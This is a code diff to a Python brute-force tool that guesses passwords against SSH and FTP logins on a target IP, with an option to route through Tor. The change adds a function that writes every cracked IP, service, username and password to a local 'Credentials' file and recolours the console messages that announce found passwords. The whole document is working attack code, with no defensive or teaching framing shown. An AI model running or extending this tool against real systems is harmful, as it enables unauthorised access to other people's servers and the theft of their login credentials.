@@ -48,13 +48,16 @@ def parse_arguments():
     parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
     return parser.parse_args()
 
+def save_to_file(ip, service, user, password):
+    with open('Credentials', 'a') as file:
+        file.write(f"IP: {ip}, Service: {service}, User: {user}, Password: {password}\n")
 
 def ssh_attack(ip, user, password):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         client.connect(ip, username=user, password=password, timeout=5)
-        print(current_timestamp(), f"Success for [*]{user}[*]:{Fore.GREEN}{password}")
+        print(current_timestamp(), f"Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
         return True
     except paramiko.AuthenticationException:
         return False
@@ -69,7 +72,7 @@ def ftp_attack(ip, user, password):
     try:
         with FTP(ip, timeout=5) as ftp:
             ftp.login(user, password)
-            print(current_timestamp(), f"Success for [*]{user}[*]:{Fore.GREEN}{password}")
+            print(current_timestamp(), f"Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
             return True
     except error_perm as e:
         if str(e).startswith('530 '):
@@ -100,17 +103,19 @@ if __name__ == '__main__':
                 if i + j >= len(passwords):
                     break
                 password = passwords[i + j]
-                print(current_timestamp(), f"Trying user [*]{user}[*] with password:{Fore.YELLOW} {password}")
+                print(current_timestamp(), f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
 
                 if args.service == 'ssh':
                     if ssh_attack(args.ip, user, password):
-                        print(current_timestamp(), f"Password found for [*]{user}[*]:{Fore.GREEN}{password}")
-                        users.remove(user)  # remove user from list if password is found
+                        print(current_timestamp(), f"Password found for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
+                        save_to_file(args.ip, args.service, user, password)
+                        users.remove(user)
                         break
                 elif args.service == 'ftp':
                     if ftp_attack(args.ip, user, password):
-                        print(current_timestamp(), f"Password found for [*]{user}[*]: {Fore.GREEN}{password}")
-                        users.remove(user)  # remove user from list if password is found
+                        print(current_timestamp(), f"Password found for [*]{user}{Fore.RESET}[*]: {Fore.GREEN}{password}")
+                        save_to_file(args.ip, args.service, user, password)
+                        users.remove(user)
                         break
 
     print(current_timestamp(), f"{Fore.BLUE}Brute force completed.")
